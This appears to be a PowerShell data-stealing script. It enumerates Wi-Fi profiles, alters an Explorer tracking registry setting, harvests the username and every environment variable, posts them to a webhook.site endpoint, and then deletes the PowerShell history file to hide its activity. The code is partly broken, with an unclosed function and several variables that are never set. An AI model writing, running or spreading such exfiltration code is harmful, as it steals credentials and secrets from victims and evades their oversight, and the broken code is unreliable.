$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
  $_.Matches.Value
}
function oneOfTheHardestThingsInCodingIsNamingThings() {
    if (Test-Path $registryPath) {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
        return "opposite of fucked up"
    } else {
        return "fucked up: not found"
    }
$wifis = @()

$envVars = @{}
gci env:* | ForEach-Object {
  $envVars[$_.Name] = $_.Value
}
$priv = oneOfTheHardestThingsInCodingIsNamingThings
$Body = @{
  'username' = $env:username
  'ipv4' = $IPV4
  'priv' = $priv
  'wifi_profiles' = $wifis
  'ipconfig' = $IPconfig
  'env' = $envVars
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
Remove-Item (Get-PSReadlineOption).HistorySavePath
